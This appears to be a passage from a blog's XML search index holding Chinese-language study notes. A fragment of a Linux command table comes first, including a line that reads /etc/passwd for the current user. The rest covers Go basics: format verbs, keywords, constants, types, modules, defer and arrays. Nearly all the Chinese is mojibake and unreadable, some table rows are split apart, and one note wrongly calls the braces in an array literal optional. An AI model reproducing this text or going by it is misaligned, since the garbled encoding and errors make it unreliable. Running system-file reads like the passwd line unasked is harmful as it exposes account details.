<td>åˆ¤æ–­æŸç¨‹åºæ˜¯å¦å¯æ‰§è¡Œ</td>
<td><code>test -x /usr/bin/python3 &amp;&amp; echo &quot;å¯æ‰§è¡Œ&quot;</code></td>
<td>è¿”å› â€œå¯æ‰§è¡Œâ€ æˆ– â€œä¸å¯æ‰§è¡Œâ€</td>
</tr>
<tr>
<td>&#96;cat &#x2F;etc&#x2F;passwd</td>
<td>grep ^$(whoami)&#96;</td>
<td>æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„ shellã€ä¸»ç›®å½•ç­‰</td>
<td>&#96;cat &#x2F;etc&#x2F;passwd</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>æ®µä½</th>
<th>å­—ç¬¦</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>æ–‡ä»¶ç±»å‹</td>
<td><code>-</code></td>
<td>æ™®é€šæ–‡ä»¶ï¼ˆ<code>d</code> æ˜¯ç›®å½•ï¼Œ<code>l</code> æ˜¯ç¬¦å·é“¾æ¥ï¼‰</td>
</tr>
<tr>
<td>æ‰€å±ç”¨æˆ·æƒé™</td>
<td><code>rw-</code></td>
<td><strong>root</strong> ç”¨æˆ·ï¼šå¯è¯»ã€å¯å†™</td>
</tr>
<tr>
<td>æ‰€å±ç»„æƒé™</td>
<td><code>r--</code></td>
<td><strong>root</strong> ç»„ï¼šå¯è¯»ï¼ˆä½†ä¸å¯å†™æˆ–æ‰§è¡Œï¼‰</td>
</tr>
<tr>
<td>å…¶ä»–ç”¨æˆ·æƒé™</td>
<td><code>r--</code></td>
<td>æ‰€æœ‰å…¶ä»–ç”¨æˆ·ï¼šå¯è¯»ï¼ˆä¸å¯å†™æˆ–æ‰§è¡Œï¼‰</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>linxu</category>
      </categories>
      <tags>
        <tag>è¯­è¨€å­¦ä¹ </tag>
        <tag>linxuå‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸºç¡€ç”¨æ³•</title>
    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="1-verbï¼ˆæ ¼å¼åŒ–åŠ¨è¯ï¼‰"><a href="#1-verbï¼ˆæ ¼å¼åŒ–åŠ¨è¯ï¼‰" class="headerlink" title="1.verbï¼ˆæ ¼å¼åŒ–åŠ¨è¯ï¼‰"></a>1.verbï¼ˆæ ¼å¼åŒ–åŠ¨è¯ï¼‰</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨ fmt.<span class="title function_ invoke__">Printf</span>()ã€fmt.<span class="title function_ invoke__">Sprintf</span>() ç­‰å‡½æ•°ä¸­ï¼Œverb æ˜¯ä»¥ % å¼€å¤´çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºå‘Šè¯‰ç¨‹åºä»¥ä½•ç§æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</span><br></pre></td></tr></table></figure>



<h3 id="1-å¸¸ç”¨-verb-æ ¼å¼åŒ–åŠ¨è¯è¡¨"><a href="#1-å¸¸ç”¨-verb-æ ¼å¼åŒ–åŠ¨è¯è¡¨" class="headerlink" title="1.å¸¸ç”¨ verb æ ¼å¼åŒ–åŠ¨è¯è¡¨"></a>1.å¸¸ç”¨ verb æ ¼å¼åŒ–åŠ¨è¯è¡¨</h3><table>
<thead>
<tr>
<th><strong>åŠ¨è¯</strong></th>
<th><strong>å«ä¹‰</strong></th>
<th><strong>ç¤ºä¾‹è¾“å‡º</strong>ï¼ˆå‡è®¾å˜é‡å€¼ä¸º <code>x = 42</code>ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>%v</code></td>
<td>é»˜è®¤æ ¼å¼è¾“å‡º</td>
<td><code>42</code></td>
</tr>
<tr>
<td><code>%+v</code></td>
<td>è¾“å‡ºç»“æ„ä½“æ—¶ï¼ŒåŒ…å«å­—æ®µå</td>
<td><code>&#123;Name:Tom Age:18&#125;</code></td>
</tr>
<tr>
<td><code>%#v</code></td>
<td>è¾“å‡º Go è¯­æ³•è¡¨ç¤ºçš„å€¼</td>
<td><code>main.User&#123;Name:&quot;Tom&quot;, Age:18&#125;</code></td>
</tr>
<tr>
<td><code>%T</code></td>
<td>æ˜¾ç¤ºå˜é‡ç±»å‹</td>
<td><code>int</code></td>
</tr>
<tr>
<td><code>%%</code></td>
<td>è¾“å‡º <code>%</code> æœ¬èº«</td>
<td><code>%</code></td>
</tr>
</tbody></table>
<h3 id="2-æ•°å€¼ç±»å‹æ ¼å¼åŒ–-verb"><a href="#2-æ•°å€¼ç±»å‹æ ¼å¼åŒ–-verb" class="headerlink" title="2.æ•°å€¼ç±»å‹æ ¼å¼åŒ– verb"></a>2.æ•°å€¼ç±»å‹æ ¼å¼åŒ– verb</h3><table>
<thead>
<tr>
<th><strong>åŠ¨è¯</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>ç¤ºä¾‹</strong> (<code>x = 42</code>)</th>
</tr>
</thead>
<tbody><tr>
<td><code>%d</code></td>
<td>åè¿›åˆ¶æ•´æ•°</td>
<td><code>42</code></td>
</tr>
<tr>
<td><code>%b</code></td>
<td>äºŒè¿›åˆ¶æ•´æ•°</td>
<td><code>101010</code></td>
</tr>
<tr>
<td><code>%o</code></td>
<td>å…«è¿›åˆ¶</td>
<td><code>52</code></td>
</tr>
<tr>
<td><code>%x</code></td>
<td>åå…­è¿›åˆ¶ï¼ˆå°å†™ï¼‰</td>
<td><code>2a</code></td>
</tr>
<tr>
<td><code>%X</code></td>
<td>åå…­è¿›åˆ¶ï¼ˆå¤§å†™ï¼‰</td>
<td><code>2A</code></td>
</tr>
<tr>
<td><code>%c</code></td>
<td>Unicode å­—ç¬¦</td>
<td><code>*</code>ï¼ˆå¦‚æœ 42ï¼‰</td>
</tr>
</tbody></table>
<h3 id="3-å­—ç¬¦ä¸²å’Œå¸ƒå°”ç±»å‹"><a href="#3-å­—ç¬¦ä¸²å’Œå¸ƒå°”ç±»å‹" class="headerlink" title="3.å­—ç¬¦ä¸²å’Œå¸ƒå°”ç±»å‹"></a>3.å­—ç¬¦ä¸²å’Œå¸ƒå°”ç±»å‹</h3><table>
<thead>
<tr>
<th><strong>åŠ¨è¯</strong></th>
<th><strong>è¯´æ˜</strong></th>
<th><strong>ç¤ºä¾‹</strong> (<code>s = &quot;hello&quot;</code>)</th>
</tr>
</thead>
<tbody><tr>
<td><code>%s</code></td>
<td>å­—ç¬¦ä¸²</td>
<td><code>hello</code></td>
</tr>
<tr>
<td><code>%q</code></td>
<td>åŒå¼•å·å­—ç¬¦ä¸²</td>
<td><code>&quot;hello&quot;</code></td>
</tr>
<tr>
<td><code>%t</code></td>
<td>å¸ƒå°”å€¼</td>
<td><code>true</code> æˆ– <code>false</code></td>
</tr>
</tbody></table>
<h3 id="4-æ€»ç»“è¡¨"><a href="#4-æ€»ç»“è¡¨" class="headerlink" title="4.æ€»ç»“è¡¨"></a>4.æ€»ç»“è¡¨</h3><table>
<thead>
<tr>
<th>ç±»åˆ«</th>
<th>verb</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>å¸¸è§„</td>
<td><code>%v</code> <code>%+v</code> <code>%#v</code> <code>%T</code> <code>%%</code></td>
<td>é€šç”¨æ ¼å¼</td>
</tr>
<tr>
<td>æ•´æ•°</td>
<td><code>%d</code> <code>%b</code> <code>%o</code> <code>%x</code> <code>%X</code> <code>%c</code></td>
<td>æ•°å€¼æ ¼å¼</td>
</tr>
<tr>
<td>å­—ç¬¦ä¸²</td>
<td><code>%s</code> <code>%q</code></td>
<td>å­—ç¬¦ä¸²å¤„ç†</td>
</tr>
<tr>
<td>å¸ƒå°”å€¼</td>
<td><code>%t</code></td>
<td>å¸ƒå°”å€¼æ˜¾ç¤º</td>
</tr>
</tbody></table>
<h2 id="2-å…³é”®å­—-25ä¸ª"><a href="#2-å…³é”®å­—-25ä¸ª" class="headerlink" title="2.å…³é”®å­—(25ä¸ª):"></a>2.å…³é”®å­—(25ä¸ª):</h2><table>
<thead>
<tr>
<th>å…³é”®å­—</th>
<th>å«ä¹‰è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>break</code></td>
<td>è·³å‡ºå¾ªç¯æˆ– <code>switch</code></td>
</tr>
<tr>
<td><code>case</code></td>
<td><code>switch</code> è¯­å¥ä¸­çš„åˆ†æ”¯æ¡ä»¶</td>
</tr>
<tr>
<td><code>chan</code></td>
<td>å£°æ˜é€šé“</td>
</tr>
<tr>
<td><code>const</code></td>
<td>å£°æ˜å¸¸é‡</td>
</tr>
<tr>
<td><code>continue</code></td>
<td>ç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯</td>
</tr>
<tr>
<td><code>default</code></td>
<td><code>switch</code> é»˜è®¤åˆ†æ”¯</td>
</tr>
<tr>
<td><code>defer</code></td>
<td>å»¶è¿Ÿæ‰§è¡Œï¼ˆå‡½æ•°ç»“æŸå‰æ‰§è¡Œï¼‰</td>
</tr>
<tr>
<td><code>else</code></td>
<td>æ¡ä»¶è¯­å¥çš„â€œå¦åˆ™â€åˆ†æ”¯</td>
</tr>
<tr>
<td><code>fallthrough</code></td>
<td><code>switch</code> ç©¿é€ä¸‹ä¸€åˆ†æ”¯</td>
</tr>
<tr>
<td><code>for</code></td>
<td>å¾ªç¯è¯­å¥</td>
</tr>
<tr>
<td><code>func</code></td>
<td>å£°æ˜å‡½æ•°</td>
</tr>
<tr>
<td><code>go</code></td>
<td>å¯åŠ¨ä¸€ä¸ª goroutineï¼ˆåç¨‹ï¼‰</td>
</tr>
<tr>
<td><code>goto</code></td>
<td>è·³è½¬åˆ°æ ‡ç­¾</td>
</tr>
<tr>
<td><code>if</code></td>
<td>æ¡ä»¶åˆ¤æ–­è¯­å¥</td>
</tr>
<tr>
<td><code>import</code></td>
<td>å¯¼å…¥åŒ…</td>
</tr>
<tr>
<td><code>interface</code></td>
<td>å®šä¹‰æ¥å£ç±»å‹</td>
</tr>
<tr>
<td><code>map</code></td>
<td>æ˜ å°„ç±»å‹ï¼ˆé”®å€¼å¯¹ç»“æ„ï¼‰</td>
</tr>
<tr>
<td><code>package</code></td>
<td>å£°æ˜åŒ…å</td>
</tr>
<tr>
<td><code>range</code></td>
<td>ç”¨äºéå†æ•°ç»„ã€åˆ‡ç‰‡ã€map ç­‰</td>
</tr>
<tr>
<td><code>return</code></td>
<td>è¿”å›å‡½æ•°ç»“æœ</td>
</tr>
<tr>
<td><code>select</code></td>
<td>å¤šé€šé“é€‰æ‹©</td>
</tr>
<tr>
<td><code>struct</code></td>
<td>å£°æ˜ç»“æ„ä½“</td>
</tr>
<tr>
<td><code>switch</code></td>
<td>å¤šåˆ†æ”¯é€‰æ‹©è¯­å¥</td>
</tr>
<tr>
<td><code>type</code></td>
<td>å£°æ˜ç±»å‹</td>
</tr>
<tr>
<td><code>var</code></td>
<td>å£°æ˜å˜é‡</td>
</tr>
</tbody></table>
<h3 id="æ€»ç»“è¡¨"><a href="#æ€»ç»“è¡¨" class="headerlink" title="æ€»ç»“è¡¨"></a>æ€»ç»“è¡¨</h3><table>
<thead>
<tr>
<th>ç±»åˆ«</th>
<th>å…³é”®å­—ä¸¾ä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>æ§åˆ¶æµç¨‹</td>
<td><code>if</code>, <code>else</code>, <code>for</code>, <code>switch</code>, <code>case</code>, <code>fallthrough</code>, <code>break</code>, <code>continue</code>, <code>goto</code>, <code>return</code></td>
</tr>
<tr>
<td>å¹¶å‘ç›¸å…³</td>
<td><code>go</code>, <code>select</code>, <code>chan</code></td>
</tr>
<tr>
<td>å®šä¹‰å£°æ˜</td>
<td><code>var</code>, <code>const</code>, <code>type</code>, <code>func</code>, <code>package</code>, <code>import</code>, <code>struct</code>, <code>interface</code>, <code>map</code></td>
</tr>
<tr>
<td>ç‰¹æ®Šç”¨é€”</td>
<td><code>defer</code>, <code>range</code></td>
</tr>
</tbody></table>
<h2 id="3-å¸¸é‡"><a href="#3-å¸¸é‡" class="headerlink" title="3.å¸¸é‡:"></a>3.å¸¸é‡:</h2><table>
<thead>
<tr>
<th>æ ‡è¯†ç¬¦</th>
<th>ç±»å‹</th>
<th>æ˜¯å¦ä¸ºå¸¸é‡</th>
<th>ç”¨é€”è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>true</code></td>
<td><code>bool</code></td>
<td>âœ… æ˜¯å¸¸é‡</td>
<td>è¡¨ç¤ºå¸ƒå°”çœŸå€¼</td>
<td><code>const ok = true</code></td>
</tr>
<tr>
<td><code>false</code></td>
<td><code>bool</code></td>
<td>âœ… æ˜¯å¸¸é‡</td>
<td>è¡¨ç¤ºå¸ƒå°”å‡å€¼</td>
<td><code>var done = false</code></td>
</tr>
<tr>
<td><code>iota</code></td>
<td><code>int</code></td>
<td>âš ï¸ ç‰¹æ®Šæ ‡è¯†ç¬¦</td>
<td>ç”¨äº <strong>å¸¸é‡å£°æ˜ç»„ä¸­è‡ªåŠ¨ç”Ÿæˆé€’å¢æ•°å­—</strong>ï¼ˆä»…åœ¨ <code>const</code> ä¸­å¯ç”¨ï¼‰</td>
<td><code>const (A = iota; B; C)</code></td>
</tr>
<tr>
<td><code>nil</code></td>
<td><code>é¢„å®šä¹‰ç©ºå€¼</code></td>
<td>âš ï¸ ä¸æ˜¯ const å¸¸é‡</td>
<td>è¡¨ç¤º<strong>æŒ‡é’ˆã€åˆ‡ç‰‡ã€mapã€chanã€æ¥å£ã€å‡½æ•°çš„é›¶å€¼</strong>ï¼ˆæœªåˆå§‹åŒ–ï¼‰</td>
<td><code>var p *int = nil</code></td>
</tr>
</tbody></table>
<h3 id="å£°æ˜æ–¹å¼"><a href="#å£°æ˜æ–¹å¼" class="headerlink" title="å£°æ˜æ–¹å¼:"></a>å£°æ˜æ–¹å¼:</h3><table>
<thead>
<tr>
<th>å£°æ˜æ–¹å¼</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
<th>æ˜¯å¦æ”¯æŒç±»å‹æ¨å¯¼</th>
</tr>
</thead>
<tbody><tr>
<td>1. æ˜¾å¼å£°æ˜ï¼ˆå¸¦ç±»å‹ï¼‰</td>
<td><code>var a int</code></td>
<td>é»˜è®¤å€¼ä¸º0ï¼ˆintï¼‰</td>
<td>âŒ ä¸æ”¯æŒ</td>
</tr>
<tr>
<td>2. æ˜¾å¼å£°æ˜ + åˆå§‹åŒ–</td>
<td><code>var a int = 10</code></td>
<td>æœ‰åˆå§‹å€¼</td>
<td>âœ… æ”¯æŒï¼ˆå¯çœç•¥ç±»å‹ï¼‰</td>
</tr>
<tr>
<td>3. ç±»å‹æ¨å¯¼å£°æ˜</td>
<td><code>var a = 10</code></td>
<td>ç±»å‹è‡ªåŠ¨ä¸º int</td>
<td>âœ…</td>
</tr>
<tr>
<td>4. çŸ­å˜é‡å£°æ˜</td>
<td><code>a := 10</code></td>
<td>åªèƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨</td>
<td>âœ…</td>
</tr>
<tr>
<td>5. å¤šå˜é‡å£°æ˜</td>
<td><code>var a, b int = 1, 2</code></td>
<td>å¯å¤šä¸ªå˜é‡åŒæ—¶å£°æ˜</td>
<td>âœ…</td>
</tr>
<tr>
<td>6. åŒ¿åå˜é‡</td>
<td><code>_ = someFunc()</code></td>
<td>ç”¨äºå¿½ç•¥è¿”å›å€¼</td>
<td>âŒ</td>
</tr>
<tr>
<td>7. å¸¸é‡å£°æ˜</td>
<td><code>const Pi = 3.14</code></td>
<td>å€¼ä¸å¯ä¿®æ”¹</td>
<td>âœ…ï¼ˆç¼–è¯‘æœŸæ¨å¯¼ï¼‰</td>
</tr>
</tbody></table>
<h2 id="4-ç±»å‹"><a href="#4-ç±»å‹" class="headerlink" title="4.ç±»å‹:"></a>4.ç±»å‹:</h2><h3 id="1-åˆ†ç±»"><a href="#1-åˆ†ç±»" class="headerlink" title="1.åˆ†ç±»:"></a>1.åˆ†ç±»:</h3><table>
<thead>
<tr>
<th>ç±»å‹ç±»åˆ«</th>
<th>æè¿°è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>1. <strong>åŸºç¡€ç±»å‹</strong></td>
<td>å†…å»ºç±»å‹ï¼ŒGo æä¾›çš„æœ€åŸºæœ¬ç±»å‹</td>
<td><code>int</code>, <code>string</code>, <code>bool</code></td>
</tr>
<tr>
<td>2. <strong>å¤åˆç±»å‹</strong></td>
<td>ç”±å¤šä¸ªå€¼ç»„åˆè€Œæˆçš„ç»“æ„ï¼Œæ”¯æŒæ›´å¤æ‚çš„æ•°æ®ç»“æ„</td>
<td><code>array</code>, <code>slice</code>, <code>map</code>, <code>struct</code></td>
</tr>
<tr>
<td>3. <strong>å¼•ç”¨ç±»å‹</strong></td>
<td>æœ¬è´¨æ˜¯æŒ‡å‘åº•å±‚æ•°æ®çš„æŒ‡é’ˆæˆ–å¼•ç”¨ï¼ˆéå€¼æ‹·è´ï¼‰</td>
<td><code>pointer</code>, <code>channel</code>, <code>func</code></td>
</tr>
<tr>
<td>4. <strong>è‡ªå®šä¹‰ç±»å‹</strong></td>
<td>ä½¿ç”¨ <code>type</code> å…³é”®å­—å®šä¹‰çš„æ–°ç±»å‹ï¼ŒåŒ…å«ç»“æ„ä½“ã€æ¥å£ã€åˆ«åç­‰</td>
<td><code>type MyInt int</code>ã€<code>type Person struct &#123;...&#125;</code></td>
</tr>
</tbody></table>
<h3 id="2-åŸºç¡€ç±»å‹"><a href="#2-åŸºç¡€ç±»å‹" class="headerlink" title="2.åŸºç¡€ç±»å‹:"></a>2.åŸºç¡€ç±»å‹:</h3><table>
<thead>
<tr>
<th>ç±»å‹å</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>int</code></td>
<td>æ•´æ•°ç±»å‹ï¼ˆå¹³å°ç›¸å…³ä½æ•°ï¼‰</td>
</tr>
<tr>
<td><code>int32</code></td>
<td>32 ä½æ•´æ•°</td>
</tr>
<tr>
<td><code>float64</code></td>
<td>64 ä½æµ®ç‚¹æ•°</td>
</tr>
<tr>
<td><code>bool</code></td>
<td>å¸ƒå°”å€¼ï¼ˆtrue&#x2F;falseï¼‰</td>
</tr>
<tr>
<td><code>string</code></td>
<td>å­—ç¬¦ä¸²ç±»å‹</td>
</tr>
</tbody></table>
<h3 id="3-å¤åˆç±»å‹"><a href="#3-å¤åˆç±»å‹" class="headerlink" title="3.å¤åˆç±»å‹:"></a>3.å¤åˆç±»å‹:</h3><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><code>array</code></td>
<td>å®šé•¿æ•°ç»„</td>
</tr>
<tr>
<td><code>slice</code></td>
<td>åŠ¨æ€æ•°ç»„åˆ‡ç‰‡</td>
</tr>
<tr>
<td><code>map</code></td>
<td>æ˜ å°„ç»“æ„ï¼Œé”®å€¼å¯¹å­˜å‚¨</td>
</tr>
<tr>
<td><code>struct</code></td>
<td>è‡ªå®šä¹‰ç»“æ„ä½“ï¼Œå¯ç»„åˆå¤šå­—æ®µ</td>
</tr>
</tbody></table>
<h3 id="4-å¼•ç”¨ç±»å‹"><a href="#4-å¼•ç”¨ç±»å‹" class="headerlink" title="4.å¼•ç”¨ç±»å‹:"></a>4.å¼•ç”¨ç±»å‹:</h3><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><code>pointer</code></td>
<td>æŒ‡é’ˆç±»å‹</td>
</tr>
<tr>
<td><code>channel</code></td>
<td>å¹¶å‘é€šé“ç±»å‹ï¼ˆç”¨äº goroutine é€šä¿¡ï¼‰</td>
</tr>
<tr>
<td><code>func</code></td>
<td>å‡½æ•°ç±»å‹ï¼Œå¯ä½œä¸ºå˜é‡&#x2F;å‚æ•°ä¼ é€’</td>
</tr>
</tbody></table>
<h3 id="5-è‡ªå®šä¹‰ç±»å‹ï¼š"><a href="#5-è‡ªå®šä¹‰ç±»å‹ï¼š" class="headerlink" title="5.è‡ªå®šä¹‰ç±»å‹ï¼š"></a>5.è‡ªå®šä¹‰ç±»å‹ï¼š</h3><table>
<thead>
<tr>
<th>ç±»å‹å½¢å¼</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>è‡ªå®šä¹‰åŸºæœ¬ç±»å‹</td>
<td><code>type MyInt int</code></td>
</tr>
<tr>
<td>è‡ªå®šä¹‰ç»“æ„ä½“</td>
<td><code>type Student struct &#123;...&#125;</code></td>
</tr>
<tr>
<td>è‡ªå®šä¹‰æ¥å£</td>
<td><code>type Writer interface &#123;...&#125;</code></td>
</tr>
<tr>
<td>ç±»å‹åˆ«åï¼ˆä¸æ˜¯æ–°ç±»å‹ï¼‰</td>
<td><code>type Rune = int32</code></td>
</tr>
</tbody></table>
<h3 id="6-æ€»ç»“-ï¼š"><a href="#6-æ€»ç»“-ï¼š" class="headerlink" title="6.æ€»ç»“ ï¼š"></a>6.æ€»ç»“ ï¼š</h3><table>
<thead>
<tr>
<th>åˆ†ç±»</th>
<th>å…³é”®å­—&#x2F;æ„é€ æ–¹å¼</th>
<th>æ˜¯å¦å€¼ç±»å‹</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>åŸºç¡€ç±»å‹</td>
<td><code>int</code>, <code>string</code>, <code>bool</code></td>
<td>âœ…</td>
<td><code>var name string</code></td>
</tr>
<tr>
<td>å¤åˆç±»å‹</td>
<td><code>array</code>, <code>slice</code>, <code>map</code></td>
<td>âŒï¼ˆslice&#x2F;mapæ˜¯å¼•ç”¨ï¼‰</td>
<td><code>[]int</code>, <code>map[string]int</code></td>
</tr>
<tr>
<td>å¼•ç”¨ç±»å‹</td>
<td><code>*T</code>, <code>chan T</code>, <code>func()</code></td>
<td>âŒ</td>
<td><code>var p *int</code></td>
</tr>
<tr>
<td>è‡ªå®šä¹‰ç±»å‹</td>
<td><code>type</code> å…³é”®å­—å®šä¹‰</td>
<td>å–å†³äºåº•å±‚ç±»å‹</td>
<td><code>type ID int</code>, <code>type T = U</code></td>
</tr>
</tbody></table>
<h2 id="5-iotaï¼š"><a href="#5-iotaï¼š" class="headerlink" title="5.iotaï¼š"></a>5.iotaï¼š</h2><p>ä¸constæ¥è¡¨ç¤ºæšä¸¾ç±»å‹:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const (</span><br><span class="line">a=10*iota</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="6-å¤šè¿”å›å€¼"><a href="#6-å¤šè¿”å›å€¼" class="headerlink" title="6.å¤šè¿”å›å€¼:"></a>6.å¤šè¿”å›å€¼:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mailres</span><span class="params">(a <span class="type">int</span>)</span></span>(<span class="type">int</span>,<span class="type">int</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span>(</span><br><span class="line">	b=a*<span class="number">2</span></span><br><span class="line">	c=a*<span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">return</span> b,c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="conståˆ†æ"><a href="#conståˆ†æ" class="headerlink" title="conståˆ†æ:"></a>conståˆ†æ:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Go ä¸­çš„ <span class="keyword">const</span> æ˜¯â€œç¼–è¯‘æœŸå¸¸é‡â€ï¼Œæ„å‘³ç€å®ƒçš„å€¼åœ¨ç¼–è¯‘é˜¶æ®µå¿…é¡» å®Œå…¨ç¡®å®šï¼Œä¸èƒ½ä¾èµ–è¿è¡Œæ—¶ä¿¡æ¯ã€‚</span><br><span class="line">ä¸èƒ½å’Œä»»ä½•å˜é‡ç›¸ç”¨</span><br></pre></td></tr></table></figure>

<h2 id="7-goæ¨¡å—åŒ–"><a href="#7-goæ¨¡å—åŒ–" class="headerlink" title="7.goæ¨¡å—åŒ–:"></a>7.goæ¨¡å—åŒ–:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">åˆå§‹åŒ–modï¼›</span><br><span class="line">module go_project</span><br><span class="line"><span class="keyword">go</span> <span class="number">1.24</span><span class="number">.2</span></span><br><span class="line">è¿™ä¸€æ­¥ä¼šç”Ÿæˆ <span class="keyword">go</span>.mod æ–‡ä»¶ï¼Œå‘Šè¯‰ Goï¼š</span><br><span class="line">æˆ‘è¿™ä¸ªé¡¹ç›®çš„æ¨¡å—åæ˜¯ go_projectï¼Œä½ ä»¥åä» go_project/lib1 å¯¼å…¥æ—¶ï¼Œå°±ä»å½“å‰ç›®å½•æ‰¾ã€‚</span><br><span class="line">/go_project/</span><br><span class="line">â”œâ”€â”€ <span class="keyword">go</span>.mod</span><br><span class="line">â”œâ”€â”€ main.<span class="keyword">go</span></span><br><span class="line">â””â”€â”€ lib1/</span><br><span class="line">    â””â”€â”€ lib1.<span class="keyword">go</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ–¹å¼</th>
<th>ç¤ºä¾‹ä»£ç </th>
<th>å«ä¹‰</th>
<th>ç‰¹ç‚¹</th>
<th>ä½¿ç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>åŒ¿åå¯¼å…¥</strong></td>
<td><code>import _ &quot;fmt&quot;</code></td>
<td>ç»™åŒ…èµ·åä¸º <code>_</code>ï¼ˆåŒ¿åï¼‰</td>
<td>âŒ æ— æ³•ä½¿ç”¨åŒ…é‡Œçš„å‡½æ•° âœ… ä¼šæ‰§è¡ŒåŒ…çš„ <code>init()</code> æ–¹æ³•</td>
<td>å¸¸ç”¨äºåªéœ€è¦æ‰§è¡ŒåŒ…åˆå§‹åŒ–é€»è¾‘ï¼Œä½†ä¸ç›´æ¥ä½¿ç”¨å…¶å‡½æ•°ï¼Œä¾‹å¦‚ï¼šæ³¨å†Œé©±åŠ¨ <code>import _ &quot;github.com/lib/pq&quot;</code></td>
</tr>
<tr>
<td><strong>åˆ«åå¯¼å…¥</strong></td>
<td><code>import aa &quot;fmt&quot;</code></td>
<td>ç»™ <code>fmt</code> åŒ…èµ·åˆ«å <code>aa</code></td>
<td>âœ… ä½¿ç”¨æ—¶éœ€å†™ <code>aa.Println()</code> ç­‰</td>
<td>é€‚ç”¨äºé¿å…å¤šä¸ªåŒ…å†²çªï¼Œæˆ–å¸Œæœ›èµ·æ›´ç®€æ´çš„åç§°</td>
</tr>
<tr>
<td><strong>ç‚¹å¯¼å…¥</strong></td>
<td><code>import . &quot;fmt&quot;</code></td>
<td>å°† <code>fmt</code> åŒ…çš„æ–¹æ³•ç›´æ¥å¯¼å…¥åˆ°å½“å‰ä½œç”¨åŸŸ</td>
<td>âœ… å¯ä»¥ç›´æ¥å†™ <code>Println()</code> è€Œä¸æ˜¯ <code>fmt.Println()</code></td>
<td>ä¸æ¨èé¢‘ç¹ä½¿ç”¨ï¼Œå®¹æ˜“é€ æˆå‘½åæ··æ·†ï¼Œå¸¸è§äºæµ‹è¯•æˆ–ä¸´æ—¶åœºæ™¯</td>
</tr>
</tbody></table>
<h2 id="8-deferçš„ä½¿ç”¨"><a href="#8-deferçš„ä½¿ç”¨" class="headerlink" title="8.deferçš„ä½¿ç”¨:"></a>8.deferçš„ä½¿ç”¨:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>ä¹‹åçš„è¯­å¥å…ˆæ‰§â¾ï¼Œ<span class="keyword">defer</span>åçš„è¯­å¥åæ‰§â¾</span><br><span class="line">       --<span class="keyword">defer</span> åä¼šç›´æ¥å‹å…¥æ ˆåº•</span><br></pre></td></tr></table></figure>

<h2 id="9-æ•°ç»„"><a href="#9-æ•°ç»„" class="headerlink" title="9.æ•°ç»„:"></a>9.æ•°ç»„:</h2><h3 id="1é™æ€æ•°ç»„"><a href="#1é™æ€æ•°ç»„" class="headerlink" title="1é™æ€æ•°ç»„:"></a>1é™æ€æ•°ç»„:</h3><h4 id="å£°æ˜æ–¹å¼-1"><a href="#å£°æ˜æ–¹å¼-1" class="headerlink" title="å£°æ˜æ–¹å¼:"></a>å£°æ˜æ–¹å¼:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myA [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line">myB:=[<span class="number">10</span>]<span class="type">int</span>&#123;&#125;     --&#123;&#125;å¯åŠ å¯ä¸åŠ </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr [10]<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//è¿™æ ·æ˜¯æµ…æ‹·è´ï¼Œä¸ä¼šå½±å“åŸå€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

